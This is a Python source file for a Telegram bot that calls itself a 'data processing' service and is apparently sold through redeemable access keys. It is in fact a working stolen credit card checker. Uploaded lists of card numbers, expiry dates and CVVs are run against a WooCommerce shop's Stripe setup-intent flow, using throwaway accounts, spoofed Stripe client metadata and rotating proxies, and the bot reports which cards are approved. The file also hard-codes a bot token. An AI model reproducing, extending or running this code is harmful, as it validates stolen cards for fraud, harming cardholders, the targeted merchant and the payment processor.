# ============================================================
#  Telegram Bot — Data Processing Interface
#  Made by TalkNeon
# ============================================================

import os
import re
import time
import random
import json
import string
import threading
import requests
from typing import Dict, Any, Optional
from datetime import datetime

try:
    from faker import Faker
    faker = Faker()
except ImportError:
    faker = None

# ============================================================
#  Configuration
# ============================================================
BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
DEVELOPER = "TalkNeon"
ADMIN_IDS = []  # Add your Telegram user IDs here

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
KEYS_FILE = os.path.join(DATA_DIR, "tg_keys.json")
USERS_FILE = os.path.join(DATA_DIR, "tg_users.json")

os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================
#  Persistence — Keys & Users
# ============================================================
def _load_json(path, default=None):
    if default is None:
        default = {}
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def load_keys():
    return _load_json(KEYS_FILE, {})


def save_keys(data):
    _save_json(KEYS_FILE, data)


def load_users():
    return _load_json(USERS_FILE, {})


def save_users(data):
    _save_json(USERS_FILE, data)


def generate_key():
    return "TN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))


def is_admin(user_id):
    return int(user_id) in ADMIN_IDS


def is_authorized(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    return str(user_id) in users


def authorize_user(user_id, key):
    users = load_users()
    users[str(user_id)] = {"key": key, "redeemed_at": time.time()}
    save_users(users)


# ============================================================
#  Telegram API helpers
# ============================================================
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"


def tg_request(method, **kwargs):
    try:
        r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30)
        return r.json()
    except Exception:
        return {}


def send_message(chat_id, text, parse_mode="HTML", reply_to=None):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_to:
        params["reply_to_message_id"] = reply_to
    return tg_request("sendMessage", **params)


def edit_message(chat_id, message_id, text, parse_mode="HTML"):
    return tg_request("editMessageText",
                      chat_id=chat_id,
                      message_id=message_id,
                      text=text,
                      parse_mode=parse_mode)


def get_file_url(file_id):
    resp = tg_request("getFile", file_id=file_id)
    if resp.get("ok"):
        path = resp["result"]["file_path"]
        return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}"
    return None


def download_file(file_id):
    url = get_file_url(file_id)
    if not url:
        return None
    try:
        r = requests.get(url, timeout=30)
        return r.text
    except Exception:
        return None


# ============================================================
#  Processing engine — ported from ehhhh.py (UNCHANGED LOGIC)
# ============================================================
def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None,
    proxies: Optional[Dict[str, str]] = None
) -> requests.Response:
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value

    if data is None: data = {}
    if params is None: params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower(): params[key] = value
            else: data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'proxies': proxies,
        'timeout': 20
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    response = req_session.request(method, **request_kwargs)
    return response


def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        if 'message' in response_json: return response_json['message']

        def find_msg(obj):
            if isinstance(obj, dict):
                if 'message' in obj: return obj['message']
                for v in obj.values():
                    res = find_msg(v)
                    if res: return res
            return None

        res_msg = find_msg(response_json)
        if res_msg: return res_msg

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"
    except:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return match.group(1)
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:100]}..."


def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

    try:
        url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_1 = {'User-Agent': user_ag}
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)

        reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        pk_match = re.search('"key":"(.*?)"', response_1.text)
        if not reg_match or not pk_match: return "Failed to extract session tokens"

        regester_nouce = reg_match.group(1)
        pk = pk_match.group(1)

        if faker:
            email = faker.email()
        else:
            email = f"user{random.randint(1000,9999)}@gmail.com"

        data_2 = {
            'email': email,
            'woocommerce-register-nonce': regester_nouce,
            'register': 'Register',
        }
        response_2 = auto_request(url_1, method='POST', headers={'User-Agent': user_ag}, data=data_2, session=session, proxies=proxies)

        nonce_match = re.search('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)
        if not nonce_match: return "Failed to extract ajax nonce"
        ajax_nonce = nonce_match.group(1)

        url_3 = 'https://api.stripe.com/v1/payment_methods'
        muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        guid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        client_id = "src_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

        data_3 = {
            'type': 'card',
            'card[number]': card_num,
            'card[cvc]': card_cvv,
            'card[exp_year]': card_yy,
            'card[exp_month]': card_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'{base_url}',
            'time_on_page': str(random.randint(10000, 99999)),
            'client_attribution_metadata[client_session_id]': client_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_id,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
            '_stripe_version': '2024-06-20',
        }
        response_3 = auto_request(url_3, method='POST', headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)

        if response_3.status_code != 200: return f"Stripe Error: {extract_message(response_3)}"
        pm = response_3.json().get('id')

        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        response_4 = auto_request(base_url + '/en/', method='POST', headers={'User-Agent': user_ag}, dynamic_params=dynamic_params_4, session=session, proxies=proxies)

        msg = extract_message(response_4)
        status = "Approved" if response_4.json().get("success") else "Declined"
        return f"{status} | {msg}"
    except Exception as e:
        return f"Error: {str(e)}"


def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    elif len(parts) == 4:
        ip, port, user, pwd = parts
        return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}
    return None


def process_single_entry(entry, proxies_list):
    """Process a single entry — exact replica of process_card from ehhhh.py."""
    raw_proxy = random.choice(proxies_list) if proxies_list else None
    proxy_dict = format_proxy(raw_proxy)

    try:
        c_data = entry.split('|')
        if len(c_data) == 4:
            c_num, c_mm, c_yy, c_cvv = c_data
            result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
        else:
            result = "Error: Invalid Format"
    except Exception as e:
        result = f"Error: {str(e)}"

    return result


# ============================================================
#  Processing runner with live progress callback
# ============================================================
def run_processing(lines, on_progress=None, on_complete=None):
    """Process entries and call on_progress / on_complete callbacks."""
    # Load proxies if available
    proxy_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
    proxies_list = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip()]

    total = len(lines)
    results = {"approved": 0, "declined": 0, "errors": 0, "total": total, "approved_list": []}

    for idx, line in enumerate(lines, 1):
        entry = line.strip()
        if not entry:
            results["errors"] += 1
            if on_progress:
                on_progress(idx, total, results, entry, "INVALID", "Empty line")
            continue

        result = process_single_entry(entry, proxies_list)

        if "Approved" in result:
            results["approved"] += 1
            results["approved_list"].append(entry)
            status = "APPROVED"
        elif "Declined" in result:
            results["declined"] += 1
            status = "DECLINED"
        else:
            results["errors"] += 1
            status = "ERROR"

        # Extract detail message after status
        detail = result.split(" | ", 1)[1] if " | " in result else result

        if on_progress:
            on_progress(idx, total, results, entry, status, detail)

    if on_complete:
        on_complete(results)

    return results


# ============================================================
#  Bot message formatters
# ============================================================
FOOTER = f"\n{'─' * 28}\n  Made by {DEVELOPER}"


def fmt_start():
    return (
        "<b>Data Processing Bot</b>\n"
        f"{'─' * 28}\n\n"
        "Upload a <b>.txt</b> file, then reply to it with <b>/run</b>\n\n"
        "<b>Commands:</b>\n"
        "  /start    — Show this menu\n"
        "  /redeem   — Unlock access\n"
        "  /run      — Process uploaded file\n"
        "  /lookup   — Lookup (coming soon)\n\n"
        "<b>How to use:</b>\n"
        "  1. Send a .txt file\n"
        "  2. Reply to the file with /run\n"
        "  3. Wait for results\n"
        f"{FOOTER}"
    )


def fmt_unauthorized():
    return (
        "<b>Access Denied</b>\n\n"
        "You need to redeem a key first.\n"
        "Use: <code>/redeem YOUR-KEY</code>\n"
        f"{FOOTER}"
    )


def fmt_progress(idx, total, results, entry, status, msg):
    pct = int((idx / total) * 100)
    bar_len = 20
    filled = int(bar_len * idx / total)
    bar = "█" * filled + "░" * (bar_len - filled)

    status_icon = {"APPROVED": "✓", "DECLINED": "✗", "ERROR": "!", "FAIL": "!", "INVALID": "?"}
    icon = status_icon.get(status, "·")

    text = (
        f"<b>Processing</b>  [{idx}/{total}]\n"
        f"<code>{bar}</code>  {pct}%\n\n"
        f"<b>Current:</b> <code>{entry[:20]}...</code>\n"
        f"<b>Status:</b>  {icon} {status}"
    )
    if msg:
        text += f" — {msg[:60]}"

    text += (
        f"\n\n<b>Results:</b>\n"
        f"  Approved:  {results['approved']}\n"
        f"  Declined:  {results['declined']}\n"
        f"  Errors:    {results['errors']}\n"
        f"{FOOTER}"
    )
    return text


def fmt_results(results):
    text = (
        f"<b>Processing Complete</b>\n"
        f"{'─' * 28}\n\n"
        f"  Total:     {results['total']}\n"
        f"  Approved:  {results['approved']}\n"
        f"  Declined:  {results['declined']}\n"
        f"  Errors:    {results['errors']}\n"
    )
    if results["approved_list"]:
        text += f"\n<b>Approved entries:</b>\n"
        for entry in results["approved_list"][:25]:
            text += f"  <code>{entry}</code>\n"
        if len(results["approved_list"]) > 25:
            text += f"  ... and {len(results['approved_list']) - 25} more\n"

    text += FOOTER
    return text


# ============================================================
#  Active processing tracker (one per user)
# ============================================================
active_users = set()
active_lock = threading.Lock()


# ============================================================
#  Command handlers
# ============================================================
def handle_update(update):
    msg = update.get("message")
    if not msg:
        return

    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    text = (msg.get("text") or "").strip()

    # --- /start ---
    if text == "/start":
        send_message(chat_id, fmt_start())
        return

    # --- /lookup ---
    if text == "/lookup":
        send_message(chat_id, f"<b>Lookup</b>\n\nComing soon.{FOOTER}")
        return

    # --- /genkey (admin) ---
    if text.startswith("/genkey"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return
        key = generate_key()
        keys = load_keys()
        keys[key] = {"created_by": user_id, "created_at": time.time(), "used": False}
        save_keys(keys)
        send_message(chat_id, f"<b>Key Generated</b>\n\n<code>{key}</code>{FOOTER}")
        return

    # --- /redeem ---
    if text.startswith("/redeem"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> <code>/redeem YOUR-KEY</code>" + FOOTER)
            return
        key = parts[1].strip()
        keys = load_keys()
        if key not in keys:
            send_message(chat_id, "<b>Invalid key.</b>" + FOOTER)
            return
        if keys[key].get("used"):
            send_message(chat_id, "<b>Key already used.</b>" + FOOTER)
            return
        keys[key]["used"] = True
        keys[key]["used_by"] = user_id
        save_keys(keys)
        authorize_user(user_id, key)
        send_message(chat_id, f"<b>Access Granted</b>\n\nWelcome aboard.{FOOTER}")
        return

    # --- /run ---
    if text == "/run":
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return

        reply = msg.get("reply_to_message")
        if not reply or not reply.get("document"):
            send_message(chat_id, "<b>Reply to a .txt file with /run</b>" + FOOTER)
            return

        doc = reply["document"]
        fname = doc.get("file_name", "")
        if not fname.lower().endswith(".txt"):
            send_message(chat_id, "<b>Only .txt files are accepted.</b>" + FOOTER)
            return

        with active_lock:
            if user_id in active_users:
                send_message(chat_id, "<b>You already have a task running.</b>" + FOOTER)
                return
            active_users.add(user_id)

        # Download file
        content = download_file(doc["file_id"])
        if not content:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, "<b>Failed to download file.</b>" + FOOTER)
            return

        lines = [l.strip() for l in content.splitlines() if l.strip()]
        if not lines:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, "<b>File is empty.</b>" + FOOTER)
            return

        # Send initial progress message
        init_resp = send_message(chat_id,
            f"<b>Starting</b>\n\nEntries: {len(lines)}\nPlease wait..."
            + FOOTER)
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        # Run processing in a thread
        def _run():
            last_edit = [0]

            def on_progress(idx, total, results, entry, status, detail):
                now = time.time()
                # Edit at most every 3 seconds to avoid rate limits
                if now - last_edit[0] < 3 and idx < total:
                    return
                last_edit[0] = now
                if progress_msg_id:
                    edit_message(chat_id, progress_msg_id,
                                 fmt_progress(idx, total, results, entry, status, detail))

            def on_complete(results):
                send_message(chat_id, fmt_results(results))
                with active_lock:
                    active_users.discard(user_id)

            try:
                run_processing(lines, on_progress=on_progress, on_complete=on_complete)
            except Exception as e:
                send_message(chat_id, f"<b>Processing error:</b> {str(e)[:200]}" + FOOTER)
                with active_lock:
                    active_users.discard(user_id)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return

    # Ignore other messages silently


# ============================================================
#  Polling loop
# ============================================================
def main():
    print(f"[Bot] Starting — Made by {DEVELOPER}")
    print(f"[Bot] Polling for updates...")

    offset = 0
    while True:
        try:
            resp = tg_request("getUpdates", offset=offset, timeout=30)
            updates = resp.get("result", [])
            for upd in updates:
                offset = upd["update_id"] + 1
                try:
                    handle_update(upd)
                except Exception as e:
                    print(f"[Bot] Error handling update: {e}")
        except KeyboardInterrupt:
            print("\n[Bot] Stopped.")
            break
        except Exception as e:
            print(f"[Bot] Polling error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
